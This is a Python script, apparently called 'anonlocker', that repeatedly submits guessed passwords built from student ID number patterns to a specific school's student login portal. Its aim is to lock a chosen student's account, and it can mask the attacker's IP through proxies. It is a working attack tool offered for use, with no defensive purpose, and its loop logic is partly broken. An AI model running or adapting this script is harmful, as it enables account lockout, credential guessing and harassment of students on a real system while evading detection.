
#Thanks for downloading anonlocker! heres a quick demo on how to run it
#to simply brute force a login use:
#python accountlocker.py --username __username__
#please replace the "__username__" with the specific username you want to lock
#to add proxys and mask your ip use 
#python accountlocker.py --username __username__ --proxy
#this will brute force the target, but also mask your ip :) however this is for linux only.

import os
import sys
import random
import threading
import urllib2
import string
import argparse
import time as t
import mechanize
from colorama import Fore

loginCount = 0
passlist = []
URL = "https://qc.apscc.org/Login_Student_PXP.aspx?regenerateSessionId=True"
check = Fore.GREEN + "[*]" + Fore.WHITE + " "
error = Fore.GREEN + "[*]" + Fore.WHITE + " "

ID_RANGE = ["219","220","221","222","223"]

parser = argparse.ArgumentParser(description='specify an username.',)
parser.add_argument('--username',help='ex: --username username',required=True)
parser.add_argument('--proxy', help='specify if you want to mask your ip with proxys (linux only).', action='store_true')
args = parser.parse_args()

logo = Fore.WHITE + '''
                                                                                                    
                                                                                                    
       {0}db{1}                                     `7MMF'                       `7MM                      
      {0};MM:  {1}                                   MM                           MM                      
     {0},V^MM.{1}   `7MMpMMMb.  ,pW"Wq.`7MMpMMMb.    MM         ,pW"Wq.   ,p6"bo  MM  ,MP'.gP"Ya `7Mb,od8 
    {0},M  `MM {1}    MM    MM 6W'   `Wb MM    MM    MM        6W'   `Wb 6M'  OO  MM ;Y  ,M'   Yb  MM' "' 
    {0}AbmmmqMA {1}   MM    MM 8M     M8 MM    MM    MM      , 8M     M8 8M       MM;Mm  8M""""""  MM     
   {0}A'     VML{1}   MM    MM YA.   ,A9 MM    MM    MM     ,M YA.   ,A9 YM.    , MM `Mb.YM.    ,  MM     
 {0}.AMA.   .AMMA{1}..JMML  JMML.`Ybmd9'.JMML  JMML..JMMmmmmMMM  `Ybmd9'   YMbmd'.JMML. YA.`Mbmmd'.JMML.   
                                                                                                                                                                                       

'''.format(Fore.RED,Fore.WHITE)

def realpasswordgen():
    chars =  string.digits
    while len(passlist) != 10:
    	ID_START = random.choice(ID_RANGE)
        IDNUMBER = ID_START +''.join((random.choice(str(chars))) for x in range(int(3)))
        passlist.append(IDNUMBER)

def server():
	os.system("proxybroker serve --host 127.0.0.1 --port 8888 --types HTTP HTTPS --lvl High")

def proxy_setup():
	print(check+"Rerouting HTTP and HTTPS traffic to localhost.")
	os.system("export http_proxy=127.0.0.1:8888")
	os.system("export https_proxy=127.0.0.1:8888")
	print(check+"Staring PROXY thread to localhost")
	th = threading.Thread(target=server)
	th.start()
	t.sleep(3)
	print(check+"Masked IP: ")
	os.system("curl ifconfig.co")
	t.sleep(3)


def bruteUser(username):
    print(check + "Disabling: "+username)
    print(check + "Starting webservice")
    t.sleep(1)
    browser = mechanize.Browser()
    browser.set_handle_robots( False )
    browser.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
    print(check+"Masking operating system.")
    t.sleep(.5)
    print (check+"Generating realistic passwords.")
    realpasswordgen()
    loginCount = 0
    while loginCount < len(passlist):
        try:
            t.sleep(.5)
            browser.open(URL)
            browser.select_form(nr = 0)
            browser.form['username'] = username
            browser.form['password'] =  passlist[loginCount]
            loginCount += 1
            browser.submit()
            sys.stdout.write('\r' + Fore.WHITE + 'Logins: '+ str(loginCount)+ '/' + Fore.RED + '10')
            loginCount += 1
        except KeyboardInterrupt:
            print("\n\n"+error+"operation stopped.")
            exit(1)
    print (check + '\nAccount has been locked!')
    UserIface()

if __name__ == "__main__":
    print(logo)
    if args.proxy == True:
    	print(check+"Checking operating system.")
    	if "linux" in sys.platform:
    		print(check+"Proxy mode enabled")
    		proxy_setup()
    	else:
    		print(error+"Invalid OS found please up linux for proxy mode '--proxy'")
    bruteUser(args.username)